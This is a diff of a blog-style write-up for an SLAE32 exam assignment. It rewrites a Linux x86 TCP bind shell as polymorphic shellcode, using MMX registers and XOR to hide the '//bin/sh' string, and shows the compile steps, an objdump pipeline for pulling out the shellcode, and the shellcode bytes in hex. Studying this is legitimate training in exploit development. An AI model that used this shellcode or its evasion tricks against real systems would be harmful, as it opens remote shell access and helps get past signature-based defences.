@@ -22,6 +22,7 @@ For the sixth assignment in the SLAE32 Exam, we needed to create 3 polymorphic s
 _What is Polymorphic Shellcode?_   
 Polymorphic shellcode means that it uses different assembly instructions to deliver the same payload.    
 For example, all of the below instructions will result in the same action.
+
 ```nasm
 mov eax, 0x00000000      ; Clears the EAX Register
 xor eax, eax             ; Clears the EAX Register
@@ -37,11 +38,13 @@ Our assignment required that our polymorphic version of the shellcode to not exc
 
 ## Polymorphic Shellcode
 + The code I added/modified is indented with one space.
+
 ```nasm
 global _start
 _start:
  xor	ecx,ecx   ; Makes the ECX Register 0
- mul	ecx       ; ECX*EAX. Result is stored in EDX:EAX. This clears the EDX and EAX.
+ mul	ecx       ; ECX*EAX. Result is stored in EDX:EAX. 
+                  ;  This clears the EDX and EAX.
  mov ebx, eax     ; sets the EBX register to 0
  push byte 0x66
  pop edi          ; save this for the other functions
@@ -95,7 +98,7 @@ int    0x80       ; System Call
 jne    dup2Loop
 
 push   edx
- mov edx, 0xffffffff     ; will be used to XOR the MM0 Register to result in "//bin/sh"
+ mov edx, 0xffffffff     ; used to XOR the MM0 Register to result in "//bin/sh"
  mov eax, 0x978cd091     ; "n/sh" XOR'd with 0xffffffff
  movd mm0, eax
  psllq mm0, 32           ; shift the mm0 register left by 4 bytes
@@ -125,12 +128,14 @@ int    0x80       ; System Call
 + To push the filename string `//bin/sh` onto the stack, I used the MMX registers.   
 
 ### Compiling the Shellcode
+
 ```console
 root# nasm -f elf32 mmxTcpBindShell.nasm -o mmxTcpBindShell.o
 root# ld mmxTcpBindShell.o -o mmxTcpBindShell
 ```
 
 ### Getting the Hex of the Shellcode
+
 ```console
 root# objdump -d tcpBindShell  | grep '[0-9a-f]:' | grep -v 'file' | \
 cut -f2 -d: | cut -f1-6 -d' ' | tr -s ' ' | tr '\t' ' ' | sed 's/ $//g' | \
@@ -144,8 +149,9 @@ sed 's/ /\\x/g' | paste -d '' -s | sed 's/^/"/' | sed 's/$/"/g'
 "\xca\x0f\x73\xf1\x20\x0f\x6e\xd2\x0f\xfc\xca\x0f\xef\xc1\x83\xec\x08\x0f"
 "\x7f\x04\x24\x31\xc0\x89\xe3\x50\x53\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80"
 ``` 
+
 ### Injecting the Shellcode in a Host Program
-I loaded it into our shellcode testing program to ensure it still worked when injected into a host program.  
++ I loaded it into our shellcode testing program to ensure it still worked when injected into a host program.  
 
 ```c
 // Filename: shellcode.c
